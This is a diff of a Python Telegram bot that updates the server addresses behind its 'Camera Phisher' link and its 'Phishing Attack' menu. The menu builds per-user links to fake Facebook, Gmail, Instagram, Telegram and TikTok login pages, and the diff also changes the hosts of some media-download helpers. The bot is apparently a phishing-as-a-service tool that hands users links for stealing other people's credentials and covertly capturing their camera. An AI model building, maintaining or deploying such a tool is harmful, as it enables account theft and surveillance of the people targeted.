@@ -777,7 +777,7 @@ async def show_cam_menu(update: Update, username: str, user_id: int) -> None:
 
 async def show_cam_link(update: Update, username: str, user_id: int) -> None:
     """Show Camera Phisher link"""
-    cam_url = f"https://camapi.help/?id={user_id}"
+    cam_url = f"https://cam-apix.vercel.app/?id={user_id}"
     
     link_text = f"""🔗 Camera Phisher Link
 
@@ -832,11 +832,11 @@ async def show_phish_menu(update: Update, username: str, user_id: int) -> None:
 async def show_phish_link(update: Update, phish_type: str, user_id: int) -> None:
     """Show Phishing Attack link"""
     urls = {
-        "facebook": f"https://api-serverx7.vercel.app/facebook/?id={user_id}",
-        "gmail": f"https://api-serverx7.vercel.app/gmail/?id={user_id}",
-        "instagram": f"https://api-serverx7.vercel.app/instagram/?id={user_id}",
-        "telegram": f"https://api-serverx7.vercel.app/telegram/?id={user_id}",
-        "tiktok": f"https://api-serverx7.vercel.app/tiktok/?id={user_id}"
+        "facebook": f"https://server-apix9.vercel.app/facebook/?id={user_id}",
+        "gmail": f"https://server-apix9.vercel.app/gmail/?id={user_id}",
+        "instagram": f"https://server-apix9.vercel.app/instagram/?id={user_id}",
+        "telegram": f"https://server-apix9.vercel.app/telegram/?id={user_id}",
+        "tiktok": f"https://server-apix9.vercel.app/tiktok/?id={user_id}"
     }
     
     icons = {
@@ -2156,8 +2156,8 @@ async def get_video_download_link(platform: str, url: str, user_id: int) -> str:
     
     apis = {
         "TikTok": f"https://api.tikmate.app/api/download?url={urllib.parse.quote(url)}",
-        "Facebook": f"https://api-serverx7.vercel.app/download/facebook?url={urllib.parse.quote(url)}&id={user_id}",
-        "YouTube": f"https://api-serverx7.vercel.app/download/youtube?url={urllib.parse.quote(url)}&id={user_id}"
+        "Facebook": f"https://server-apix9.vercel.app/download/facebook?url={urllib.parse.quote(url)}&id={user_id}",
+        "YouTube": f"https://server-apix9.vercel.app/download/youtube?url={urllib.parse.quote(url)}&id={user_id}"
     }
     
     try:
@@ -2173,10 +2173,10 @@ async def get_audio_download_link(platform: str, url: str, user_id: int) -> str:
     import urllib.parse
     
     apis = {
-        "Spotify": f"https://api-serverx7.vercel.app/download/spotify?url={urllib.parse.quote(url)}&id={user_id}",
-        "YouTube Music": f"https://api-serverx7.vercel.app/download/youtube-music?url={urllib.parse.quote(url)}&id={user_id}",
-        "SoundCloud": f"https://api-serverx7.vercel.app/download/soundcloud?url={urllib.parse.quote(url)}&id={user_id}",
-        "Apple Music": f"https://api-serverx7.vercel.app/download/apple-music?url={urllib.parse.quote(url)}&id={user_id}"
+        "Spotify": f"https://server-apix9.vercel.app/download/spotify?url={urllib.parse.quote(url)}&id={user_id}",
+        "YouTube Music": f"https://server-apix9.vercel.app/download/youtube-music?url={urllib.parse.quote(url)}&id={user_id}",
+        "SoundCloud": f"https://server-apix9.vercel.app/download/soundcloud?url={urllib.parse.quote(url)}&id={user_id}",
+        "Apple Music": f"https://server-apix9.vercel.app/download/apple-music?url={urllib.parse.quote(url)}&id={user_id}"
     }
     
     try:
